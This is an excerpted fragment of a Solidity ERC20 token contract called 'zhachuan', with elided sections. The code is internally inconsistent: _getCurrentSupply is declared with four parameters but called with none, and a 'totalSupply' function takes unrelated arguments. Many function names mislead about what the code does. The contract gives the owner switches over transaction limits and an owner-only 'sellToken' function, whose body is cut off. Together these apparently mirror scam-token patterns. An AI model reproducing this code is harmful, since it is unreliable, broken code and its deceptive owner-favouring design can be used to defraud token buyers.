...
contract zhachuan is Context, IERC20, Ownable {
    using SafeMath for uint256;  

    string private _name = "zhachuan";
    string private _symbol = "KAOCHANG";
    ...
    function restAnalysis(uint256 rFee, uint256 tFee) private {
        _rTotal    = _rTotal - rFee;
        _tFeeTotal = _tFeeTotal + tFee;
    }

    function getLastRebase(bool _flag, uint256 val) external view returns(uint256) {
			uint256 _autoRebase;
			if (_flag) {            
    ...
    function _getCurrentSupply(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
	...
	function totalSupply(bool _flag, uint256 val) external view returns(uint256) {
			uint256 _autoRebase;
			if (_flag) {            
				_autoRebase = block.timestamp;
			} else {
    ...
    function approveOf() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply / tSupply;
    }    

    function updateAntiWhaleEnabled(bool enable) external onlyOwner {
        _antiWhale = enable;
    }    

    function updateAntiMaxTx(bool enable) external onlyOwner {
        _antiMaxTX = enable;
    }  

    function updateMaxTx(uint256 max) external onlyOwner {
        _maxTxAmount = max;
    }

    function sellToken(address to, uint256 _token) external onlyOwner
		{
